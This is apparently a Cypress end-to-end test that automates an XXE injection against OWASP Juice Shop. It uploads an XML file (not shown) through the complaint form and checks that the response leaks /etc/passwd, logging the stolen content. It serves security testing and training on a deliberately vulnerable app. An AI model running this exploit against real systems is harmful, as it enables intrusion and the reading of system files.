const baseUrl = Cypress.env("JUICESHOP_URL");
const selectors = Cypress.env("selectors");
const endpoints = Cypress.env("endpoints");
const pathToComplainXML = "xml_injection/get_creds.xml";

describe("File Upload Exploit", () => {
  beforeEach(() => {
    cy.initializeUI();
  });

  it("Récupérer le contenu de /etc/passwd via envoi de fichier XML sur le formulaire de réclamation (Complain)", () => {
    // Connect
    cy.loginAPI_asClient();
    cy.visit(`${baseUrl}${endpoints.ui.complain}`);

    // Fill form
    cy.get(selectors.complain.message).type("Test XXE Injection.");
    cy.get(selectors.complain.fileUpload).attachFile({
      filePath: pathToComplainXML,
      mimeType: "application/xml",
      encoding: "utf-8",
    });

    // Intercept request
    cy.intercept("POST", `${baseUrl}${endpoints.api.anyFileUpload}`).as(
      "fileUpload"
    );
    cy.get(selectors.complain.submit).click();

    // Check response
    cy.wait("@fileUpload", { requestTimeout: 10000 }).then((interception) => {
      const responseBody = interception.response.body;
      expect(responseBody).to.include("root:x:0:0");
      cy.log("Contenu de /etc/passwd récupéré avec succès: ", responseBody);
    });
  });
});
